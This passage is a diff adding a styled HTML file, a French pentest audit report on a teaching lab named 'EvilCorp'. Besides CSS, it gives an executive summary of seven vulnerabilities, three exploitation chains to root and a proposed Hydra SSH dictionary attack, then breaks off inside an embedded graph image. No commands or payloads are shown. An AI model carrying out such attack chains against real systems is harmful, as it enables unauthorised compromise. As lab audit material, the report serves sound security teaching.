@@ -1,0 +1,1503 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Rapport d’audit EvilCorp</title>
+  <style>
+    @page { size: A4; margin: 16mm 15mm 17mm; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      color: #172b35;
+      background: #ffffff;
+      font-family: "Liberation Sans", Arial, sans-serif;
+      font-size: 10.5pt;
+      line-height: 1.48;
+    }
+    @media screen {
+      html {
+        min-height: 100%;
+        background: #e8eef0;
+      }
+      body {
+        width: min(1280px, 100%);
+        min-height: 100vh;
+        margin: 0 auto;
+        box-shadow: 0 0 60px rgba(17, 43, 54, 0.14);
+      }
+      body > section:not(.cover) {
+        padding: 48px clamp(32px, 5vw, 72px) 58px;
+        background: #ffffff;
+      }
+      .report-nav {
+        position: sticky;
+        z-index: 50;
+        top: 0;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        min-height: 58px;
+        padding: 8px clamp(18px, 3vw, 38px);
+        overflow-x: auto;
+        color: #b9cbd1;
+        background: rgba(7, 25, 37, 0.97);
+        border-bottom: 1px solid #254651;
+        box-shadow: 0 8px 24px rgba(7, 25, 37, 0.18);
+        scrollbar-width: thin;
+        scrollbar-color: #2c6570 transparent;
+      }
+      .report-nav__label {
+        flex: 0 0 auto;
+        margin-right: 14px;
+        color: #42d7d0;
+        font-size: 8pt;
+        font-weight: bold;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+      }
+      .report-nav a {
+        flex: 0 0 auto;
+        padding: 8px 10px;
+        color: #aebfc5;
+        border: 1px solid transparent;
+        font-family: "Liberation Mono", monospace;
+        font-size: 8pt;
+        text-decoration: none;
+        transition: color 150ms ease, border-color 150ms ease, background 150ms ease;
+      }
+      .report-nav a:hover,
+      .report-nav a:focus {
+        color: #edfffd;
+        border-color: #28736f;
+        background: #10323d;
+        outline: none;
+      }
+      .vulnerability {
+        scroll-margin-top: 74px;
+      }
+    }
+    @media screen and (max-width: 720px) {
+      body > section:not(.cover) {
+        padding: 30px 20px 40px;
+      }
+      .cover {
+        min-height: 100vh !important;
+        padding: 54px 24px 36px !important;
+      }
+      .report-nav {
+        min-height: 52px;
+        padding: 7px 12px;
+      }
+      .report-nav__label {
+        margin-right: 7px;
+      }
+    }
+    h1, h2, h3, h4 { color: #102f3b; page-break-after: avoid; }
+    h1 { margin: 0; font-size: 31pt; line-height: 1.05; letter-spacing: -1px; }
+    h2 { margin: 6mm 0 4mm; padding-bottom: 2.5mm; border-bottom: 2px solid #159c98; font-size: 20pt; }
+    h3 { margin: 5mm 0 2mm; font-size: 12.5pt; }
+    p { margin: 0 0 3mm; }
+    ul { margin: 1mm 0 4mm; padding-left: 6mm; }
+    li { margin-bottom: 1.2mm; }
+    code, pre { font-family: "Liberation Mono", "Courier New", monospace; }
+    code { color: #087b75; }
+    pre {
+      margin: 2mm 0 5mm;
+      padding: 4mm;
+      color: #d8f6ed;
+      background: #0a1c26;
+      border-left: 4px solid #28c7be;
+      font-size: 8.2pt;
+      line-height: 1.45;
+      white-space: pre-wrap;
+      overflow-wrap: anywhere;
+      page-break-inside: avoid;
+    }
+    table { width: 100%; border-collapse: collapse; page-break-inside: avoid; }
+    th, td { padding: 2.2mm 2.5mm; border: 1px solid #c9d6da; vertical-align: top; }
+    th { color: #31515d; background: #e9f0f1; font-size: 8.5pt; text-align: left; }
+    .cover {
+      min-height: 245mm;
+      padding: 20mm 16mm 14mm;
+      color: #edf8f7;
+      background: #071925;
+      page-break-after: always;
+    }
+    .cover .classification {
+      display: inline-block;
+      margin-bottom: 32mm;
+      padding: 2mm 3mm;
+      color: #46ddd4;
+      border: 1px solid #25736f;
+      font-size: 8pt;
+      letter-spacing: 1.5px;
+    }
+    .cover h1 { color: #f0f7f8; }
+    .cover h1 span { display: block; color: #42d7d0; }
+    .cover .subtitle {
+      max-width: 125mm;
+      margin-top: 8mm;
+      color: #9fb6bf;
+      font-size: 13pt;
+      line-height: 1.6;
+    }
+    .cover .cover-line { width: 28mm; height: 1px; margin: 13mm 0; background: #42d7d0; }
+    .cover .meta {
+      margin-top: 45mm;
+      color: #acc0c8;
+      border-top: 1px solid #25404b;
+    }
+    .cover .meta td { padding: 4mm 0; border: 0; border-bottom: 1px solid #25404b; background: transparent; }
+    .cover .meta td:first-child { width: 42mm; color: #5f8795; font-size: 8pt; text-transform: uppercase; }
+    .section-tag {
+      margin-top: 2mm;
+      color: #0b8e89;
+      font-size: 7.5pt;
+      font-weight: bold;
+      letter-spacing: 1.2px;
+    }
+    .page-break { page-break-before: always; }
+    .intro-box, .notice {
+      margin: 4mm 0;
+      padding: 4mm;
+      border-left: 4px solid #159c98;
+      background: #edf7f6;
+    }
+    .notice.warning { border-color: #d19b2b; background: #fff8e9; }
+    .notice.muted { border-color: #81939a; background: #f2f4f5; }
+    .mapping-table td:first-child { width: 35%; font-family: "Liberation Mono", monospace; font-weight: bold; }
+    .path-card {
+      margin: 3mm 0;
+      padding: 4mm;
+      border: 1px solid #cbd8dc;
+      border-left: 5px solid #159c98;
+      background: #f7faf9;
+      page-break-inside: avoid;
+    }
+    .path-card strong { color: #0b7874; }
+    .graph-image {
+      display: block;
+      width: 165mm;
+      max-height: 128mm;
+      margin: 5mm auto;
+      object-fit: contain;
+      border: 1px solid #b9c8cc;
+    }
+    .summary-table { font-size: 8.2pt; }
+    .summary-table th { color: white; background: #163e4b; }
+    .summary-table td:nth-child(1), .summary-table td:nth-child(4) { white-space: nowrap; }
+    .risk-high { color: #a91f36; font-weight: bold; }
+    .risk-medium { color: #9a6811; font-weight: bold; }
+    .risk-low { color: #27764c; font-weight: bold; }
+    .risk-na, .risk-none { color: #6e7c82; font-weight: bold; }
+    .identity-table { margin: 3mm 0 5mm; font-size: 8.4pt; }
+    .identity-table th { width: 18%; }
+    .identity-table td { width: 32%; }
+    .cvss-block {
+      margin-top: 7mm;
+      padding: 5mm;
+      border: 1px solid #aebfc5;
+      background: #f4f8f8;
+      page-break-inside: auto;
+    }
+    .cvss-heading { display: table; width: 100%; }
+    .cvss-heading > div { display: table-cell; vertical-align: middle; }
+    .cvss-heading span { color: #168d88; font-size: 7pt; font-weight: bold; letter-spacing: 1px; }
+    .cvss-heading h3 { margin: 1mm 0 0; }
+    .score {
+      width: 28mm;
+      padding: 3mm;
+      color: white !important;
+      background: #be3448;
+      text-align: center;
+    }
+    .score.risk-medium { background: #c18b27; }
+    .score.risk-low { background: #37835a; }
+    .score.risk-na, .score.risk-none { background: #718087; }
+    .score strong { display: block; color: white; font-size: 24pt; line-height: 1; }
+    .score small { display: block; margin-top: 1mm; color: white; font-size: 7pt; text-transform: uppercase; }
+    .vector {
+      margin: 4mm 0 2mm;
+      padding: 2.5mm;
+      background: #e3eeee;
+      font-size: 9pt;
+    }
+    .rationale { color: #506871; font-size: 9pt; }
+    .matrix-layout { width: 100%; }
+    .matrix-layout > div { margin: 3mm 0; }
+    .risk-matrix { width: 100%; table-layout: fixed; font-size: 7.5pt; text-align: center; }
+    .risk-matrix caption { margin-bottom: 2mm; color: #36545f; font-weight: bold; text-align: left; }
+    .risk-matrix th, .risk-matrix td { height: 9mm; padding: 1mm; text-align: center; }
+    .risk-matrix th { background: #dce7e9; }
+    .matrix-low { background: #dff0e6; }
+    .matrix-medium { background: #f6e9bf; }
+    .matrix-high { background: #f3ced3; }
+    .matrix-point {
+      display: inline-block;
+      min-width: 7mm;
+      padding: 1.2mm;
+      color: white;
+      background: #0a6f6b;
+      border-radius: 50%;
+      font-weight: bold;
+    }
+    .matrix-unavailable {
+      padding: 7mm;
+      color: #62747b;
+      border: 1px dashed #9daeb4;
+      background: #edf1f2;
+      text-align: center;
+    }
+    .metrics-table { margin-top: 3mm; font-size: 8pt; }
+    .metrics-table th { color: white; background: #2b5563; }
+    .calculation { margin-top: 4mm; padding: 3mm 4mm; background: #0d2732; page-break-inside: avoid; }
+    .calculation p { position: relative; margin: 0; padding: 2.5mm 18mm 2.5mm 0; color: #c7d9df; border-bottom: 1px solid #29444f; }
+    .calculation p:last-child { border-bottom: 0; }
+    .calculation strong { color: white; }
+    .calculation code { color: #72ddd3; font-size: 8pt; }
+    .calculation span { float: right; color: #72ddd3; font-weight: bold; }
+    .method-list { counter-reset: method; padding: 0; list-style: none; }
+    .method-list li { margin: 3mm 0; padding: 3mm 3mm 3mm 13mm; border-left: 3px solid #159c98; background: #f2f7f7; }
+    .method-list li:before { counter-increment: method; content: counter(method); margin-left: -9mm; margin-right: 4mm; color: #159c98; font-weight: bold; }
+    .footer-note { margin-top: 10mm; color: #73868d; font-size: 8pt; text-align: center; }
+  </style>
+</head>
+<body>
+  <section class="cover">
+    <div class="classification">LIVRABLE D’AUDIT · LABORATOIRE PÉDAGOGIQUE</div>
+    <h1>Rapport d’audit<span>EvilCorp</span></h1>
+    <p class="subtitle">Analyse des chemins d’exploitation, preuves techniques, impacts, recommandations et matrices de risque CVSS v2.</p>
+    <div class="cover-line"></div>
+    <table class="meta">
+      <tr><td>Cible</td><td>10.10.10.83</td></tr>
+      <tr><td>Périmètre</td><td>Applications web, FTP, SSH et élévations locales</td></tr>
+      <tr><td>Date</td><td>3 juillet 2026</td></tr>
+      <tr><td>Version</td><td>1.0</td></tr>
+      <tr><td>Classification</td><td>Usage pédagogique — diffusion contrôlée</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <div class="section-tag">01 · SYNTHÈSE</div>
+    <h2>Synthèse exécutive</h2>
+    <p>L’audit du laboratoire EvilCorp a permis d’identifier plusieurs points d’entrée distants et trois chaînes d’exploitation confirmées menant à une compromission complète du compte Root.</p>
+    <div class="intro-box">
+      <strong>Résultat principal.</strong> Sept vulnérabilités sont confirmées. VULN-02 possède une méthode de validation probable par attaque Hydra, mais reste provisoire. VULN-09 n’est pas identifiée et ne reçoit donc aucun score CVSS.
+    </div>
+    <h3>Chemins confirmés vers Root</h3>
+    <div class="path-card"><strong>Chemin 1 — Application PINGOZAURUS</strong><br>Kali → VULN-01 → www-data → VULN-05 → John → VULN-06 → Root</div>
+    <div class="path-card"><strong>Chemin 2 — FTP / Alice</strong><br>Kali → VULN-03 → Alice → VULN-07 → Root</div>
+    <div class="path-card"><strong>Chemin 3 — EvilCorp Web / Bob</strong><br>Kali → VULN-04 → Bob → VULN-08 → Root</div>
+    <h3>Chemins à confirmer</h3>
+    <div class="path-card"><strong>VULN-02</strong><br>Kali → attaque par dictionnaire SSH à valider → John</div>
+    <div class="path-card"><strong>VULN-09</strong><br>Kali → mécanisme non identifié → Root</div>
+  </section>
+
+  <section class="page-break">
+    <div class="section-tag">02 · CARTOGRAPHIE</div>
+    <h2>Cartographie des chemins d’attaque</h2>
+    <img class="graph-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAskAAAI7CAYAAAAebwb/AAAAAXNSR0IArs4c6QAACuh0RVh0bXhmaWxlACUzQ214ZmlsZSUyMGhvc3QlM0QlMjJhcHAuZGlhZ3JhbXMubmV0JTIyJTIwbW9kaWZpZWQlM0QlMjIyMDIxLTA3LTI3VDE4JTNBNTQlM0EwMy44ODRaJTIyJTIwYWdlbnQlM0QlMjI1LjAlMjAoWDExJTNCJTIwTGludXglMjB4ODZfNjQpJTIwQXBwbGVXZWJLaXQlMkY1MzcuMzYlMjAoS0hUTUwlMkMlMjBsaWtlJTIwR2Vja28pJTIwQ2hyb21lJTJGOTIuMC40NTE1LjEwNyUyMFNhZmFyaSUyRjUzNy4zNiUyMiUyMHZlcnNpb24lM0QlMjIxNC45LjIlMjIlMjBldGFnJTNEJTIyLWktZWEzbTg4am04dWdKX0pCYUUlMjIlMjB0eXBlJTNEJTIyZ29vZ2xlJTIyJTNFJTNDZGlhZ3JhbSUyMGlkJTNEJTIySWE5bEQxSzF6bTVPSEJHX2NfV3MlMjIlM0U3VnRkYzZNMkZQMDFmb3dISVNIZ01ZNno3WFMyTXp0TjIyMmVNdGpJdG1ZeGNrRk83UDMxRlNCaEpNQWZHSHZqYmZ5UW9DdWhyM04wdUxxQ0FYeFlibjVKZ3RYaWR4YVNhR0JiNFdZQXh3UGJCdGlGNGw5bTJSWVdENEhDTUU5b0tBdnRERSUyRjBPNUZHUzFyWE5DU3BWcEF6Rm5HNjBvMVRGc2RreWpWYmtDVHNUUzgyWTVIZTZpcVlrNXJoYVJwRWRldFhHdktGSElYdDd1eSUyRkVqcGZxSllCOW91Y1phQUt5NUdraXlCa2J4VVRmQnpBaDRReFhsd3ROdzhreWlaUHpVdHgzNmVXM0xKakNZbjVNVGZZeFEydlFiU1dZNVA5NGxzMTJJU3Q0NUJrNWEwQkhMMHRLQ2RQcTJDYTViNEplSVZ0d1plUlNBRnhPV014bDNnQlY2UlRuckJ2NVNUQnJBU05vZ2NXc1NTdkhjNzhtWnRWTGt0V2NpQ0dQc3h6UkdzMG52JTJGSlJGdGpaMmZRVTUlMkZKakV0TEZFeElOR0pKU0pKS2ZWYiUyQkU5bHl5Q1RoWk5NNmJhQUVRN0NZc0NYaHlWWVVrVGU0RWo3SlgxRjNrWDdic2NGVlpGMVVtSUNVTVpBTW5KZFY3MEFTRnhLblpzemdZY3lDZEZYd2ZrWTMlMkJleXVHSTA1U1I1ZnhRQlRpVlhKdld4U3dpQmRsQ0JYQU5WaGlWbE0xQVIlMkZZU25sbE1YQ1BDVlo1U0lqbTFRcTFzbG5vOENFY2M2V2xRTDNFWjFuR1R3RGRSVElWRm1QUVJMTEFwNDNMcnE4eW9hNDNNd3paUmtHMzljSkdhNVRjZFA1b0VMZlFCVTJvT3JXUWZYQTBBZm53NHBxc1A2Vmo4djYlMkJnRnYwaUF0ZVZyT0Nld0Jmb0IxJTJCQjM3cXZBN2JmRCUyRk5yQnhKTm9hVFJLTkJmamZkZmFVeU9maExzMG41bDRVQU81cWs0dWN5aGRYYzE3SzNnZUxMc3NpYVA5UUZ1RTJGdDElMkZ3SDhOJTJCSkgzUSUyQkYzMiUyQkQlMkZXUDFYZ1IlMkJqSHdxJTJGZDlnekpIRjRuJTJCMkFka2hWa0JTalRMYiUyRlpBZ1BIWlY4bG9EbmlmRkdTMjJycVM4a29hTEgyVHpueHBRSENWZHRUU0kyJTJGWmFYREQlMkZSclAlMkZGZmFIWVZzbSUyQmtXakMzaDUzaGxGdUVCbUtEdzE3aHhuQjAyblQzaUYwJTJGVW5GMTglMkZhMFJCTjJUcVpFdTNCSzNvN0o4cE5QeHIzQ3E1T2c3JTJCdmJBbUpBazVmOVU0MElTMWIlMkJKS3R4UjJ0eW8ydnBKVUxqVzFFTVI1NVYzVzdaMVprJTJCRGpZTXlvcVpxRldrWUF4MkZhSzVWcVI3dW13NlV0WjFrbjlPbGpla0Zua2ElMkJYRlJkSGozYW9wTVR0cUlmbTFoZlQzT29xRnhYTHFLMHFRS3hjemZTM1ZCTXZVdFNVTnc1em9DUkhlV3pESjY3T1VFT2NUN1l3R3p0aVFLZEFxVXpMYUlXc2FsREdHS28yOXZmSjFadzBCZG5xaDdCMTA5RnZZYkpZU2JxQjBLaTVxSFhSWHVBM2xGWUVUcWVkS3prN2Vzc1Mya3JpJTJCdUpIOHR6Y3djb1M0d1hlbVpCQjdRMGRmNmwyMURCcEJHQWU0UTclMkZ5OHk2aWJOQlVIcTlmNVFGcWZkZWxCOSUyQjI5QUJyc0U5N3JLSHRXcjZPYUQ5S1pHdVYzbDFFbDQ2SW8lMkI3VnBRdm9TVjlTWiUyQm9TQ0IzaU51bVNqMTBZNE52VUpXUTQ3c2p1cUVwTzIlMkY2JTJGWngxQyUyRm1rZWt4bmM3TnRqQXZXb3ROSXQ5OFoxeXo2Z1c5RDEzRWFKT2RmcjF5dDFMNkZiOWFEemFicDFPJTJGNlVVQzB2UkUyNjVka1RpRzlWdHpBdyUyRkNtRXNsaUNWZjZNS28lMkZWTVd3R3NzeVRxNTUwekhFTVhYSjYxcVY2WEYzcGtuZmp1b1FPNkJKQVFQZW43bUF2bkx1RFZtTzElMkZTcFRheVQ3anhwc1l2YjRFU0hKcWlCSTAlMkZISU5wMTc2eWZqRFVmZGx3NDJHMUVUcU5aU1ZYdjh1dmFZTGttWFVDT29oNXFmMmJvR1RYMEIxT0xPJTJCeFphZSUyRnlaTHZOM05OVCUyRk1WM09SWmNqT2hGJTJGZ3lpaUpIemhKQkxMVVdqUHB5bGJydGFpeHBjZ3pzekprc1pCbEdXSXgxREt4UFhMZ3l3eFRGJTJGbjF6Z2x3a0JEem0wNGF2YnNJY0oxOEFBQVF4ZjNBR0E5V0t5RWNhOFBNSTJDTktYVE5qY0FlYWppQ054WlF3c3F6NkQ3bHNNQnlMSnF5MXJrakd6NVRrZURyTzU5amdQM2FNaXVGQmd4JTJGZm5PWVJFenhHdFcxUExnN3FMUjdXRlNjQWFGaEVObVVNaHl6NldRZU5vSHpSU3lMTWY5U1Nqa2dDSE9qcUIwejA5SmpPMkl0ZWpCTWo3V2pWN21VY1FGNmFVZVV3MzBnaWZUeXp3NkNrSTNhRHc2bWlEc1dLakdCMjJyNDVvU0IwJTJGbTV5MFNEQmxiVXJldklNa2xTZFFlVDBWbmFCVEdmb1VEMXZueTVGaGsxaXhQWUR4NiUyQkJua0NVR0RQVjJmY09iVzlKTHNzV3ZzT1owMDVhRzZTanhYYzA0NVVxJTJGd0QySkRnNEI5TGdsbjNwUTBINmRQUENmYmwzYzlUbjl2UVpPYXI5VlZ4OHozZ05HUlREdzFTQUxNZGxDJTJGUVpKalhpbSUyQklzMVA1MlZ6R1BKMFdUNkMzJTJGZ0clMkJkMVZhV3VuSWhkNlhlVGklMkZENHR6UDMlMkIlMkJOM0N5JTJGZE13b01CNVA4ZENkc2owWDZkamJjVWliWVBS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